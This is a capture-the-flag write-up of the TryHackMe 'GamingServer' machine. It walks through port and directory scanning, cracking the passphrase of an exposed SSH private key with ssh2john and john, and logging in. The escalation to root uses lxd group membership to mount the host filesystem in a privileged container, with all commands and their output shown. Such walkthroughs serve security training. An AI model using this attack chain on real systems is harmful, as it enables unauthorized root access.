---
title: GamingServer
categories: [writeups,TryHackMe]
tags: [b2r,Linux,Privilege-Escalation,ssh2john,lxd]
---

# GamingServer
- Difficulty : `Easy`
- Operating System : `Linux`

# Table of Content
- [GamingServer](#gamingserver)
- [Table of Content](#table-of-content)
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)
- [Privilege Escalation](#privilege-escalation)

# Nmap Result
```
Nmap scan report for 10.10.60.239                                                
Host is up, received conn-refused (0.32s latency).                               
Scanned at 2022-08-01 08:39:57 UTC for 19s                                       
                                                                                 
PORT   STATE SERVICE REASON  VERSION                                             
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; proto
col 2.0)                                                                         
| ssh-hostkey:                                                                   
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)                   
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1O
qlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Method to solve the challenge
In this challenge, we will be starting off with their website.
<br>
![](/assets/img/posts/2022-08-01-GamingServer-1.png)
<br>
Running gobuster first might be useful as it need times to run and it might help us getting valuable information.
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.60.239
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.60.239
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/01 04:37:36 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]  
/secret               (Status: 301) [Size: 313] [--> http://10.10.60.239/secret/]
/server-status        (Status: 403) [Size: 277]                                  
/uploads              (Status: 301) [Size: 314] [--> http://10.10.60.239/uploads/]
                                                                                  
===============================================================
2022/08/01 04:40:14 Finished
===============================================================
```
With gobuster, we managed to found 2 interesting directories which is `secret` and `uploads`. 
<br>
![](/assets/img/posts/2022-08-01-GamingServer-2.png)
<br>
![](/assets/img/posts/2022-08-01-GamingServer-3.png)
<br>
From the directories, we managed to found a useful wordlist and a file which could be use to login into ssh server without a password.
<br>
![](/assets/img/posts/2022-08-01-GamingServer-4.png)
<br>
Not only that, we also managed to found a potential username from the source code of the website. Since we have so many information, we could try to ssh into their serverwith user `john` and hopefully getting shell.
```
ssh -i secretKey john@10.10.60.239
The authenticity of host '10.10.60.239 (10.10.60.239)' can't be established.
ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:11: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.60.239' (ED25519) to the list of known hosts.
Enter passphrase for key 'secretKey': 
Enter passphrase for key 'secretKey': 
john@10.10.60.239's password: 
Permission denied, please try again.
john@10.10.60.239's password: 
Permission denied, please try again.
john@10.10.60.239's password: 
john@10.10.60.239: Permission denied (publickey,password).
```
Based on the file `secretKey` found from website, it has own passphrase which we need in order to login into ssh. To get the passphrase, we could try to use ssh2john to get hash and crack it.
```
ssh2john secretKey > hash.txt 

john --wordlist=~/dict.lst hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2022-08-01 04:50) 33.33g/s 7400p/s 7400c/s 7400C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Based on the result, we managed to find the passphrase. The passphrase worked successfully and we managed to get ourselves a ssh shell.
```
ssh -i secretKey john@10.10.60.239
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Aug  1 09:04:26 UTC 2022

  System load:  0.0               Processes:           97
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.60.239
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

# Privilege Escalation
Although we managed to get a shell, we are not in a root account. Therefore, we will perform privilege escalation and try to get root account. As usual always start with the basic such as check sudo permission or suid binary or use linpeas.sh.
```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
In this case, we noticed that the id of of john includes `lxd`. This is a vulnerability which allow user to get root account without the need of any passwords. To perform this exploit, we will need `build-alpine` in our host.
```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```
The output of `build-alpine` will be a tar.gz file. We will need to transfer the file to the victim machine.
```
on host : 
python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

on victim:
john@exploitable:/tmp$ wget 10.6.105.254/alpine-v3.16-x86_64-20220801_0423.tar.gz--2022-08-01 09:16:19--  http://10.6.105.254/alpine-v3.16-x86_64-20220801_0423.tar.gz
Connecting to 10.6.105.254:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3203165 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.16-x86_64-20220801_0423.tar.gz’

alpine-v3.16-x86_64- 100%[===================>]   3.05M   479KB/s    in 7.5s    

2022-08-01 09:16:27 (419 KB/s) - ‘alpine-v3.16-x86_64-20220801_0423.tar.gz’ saved [3203165/3203165]
```
After sending the file to victim machine, we will import the file to LXD
```
john@exploitable:/tmp$ lxc image import ./alpine-v3.16-x86_64-20220801_0423.tar.gz --alias myimage
Image imported with fingerprint: f41308ac8b02e4ff86e56f0125a34caa7012949254876a13
```
After the image was imported, we could check the list of images to confirm.
```
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | f41308ac8b02 | no     | alpine v3.16 (20220801_04:23) | x86_64 | 3.05MB | Aug 1, 2022 at 9:18am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

```
After confirming the image, we could start to perform the trick which gave us root account.
```
john@exploitable:/tmp$ lxc init myimage callmeks -c security.privileged=true
Creating callmeks
john@exploitable:/tmp$ lxc config device add callmeks mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to callmeks
john@exploitable:/tmp$ lxc start callmeks
john@exploitable:/tmp$ lxc exec callmeks /bin/sh
~ # id
uid=0(root) gid=0(root)
```
Thats how we got our root! the main directory will be placed at `/mnt/root`.
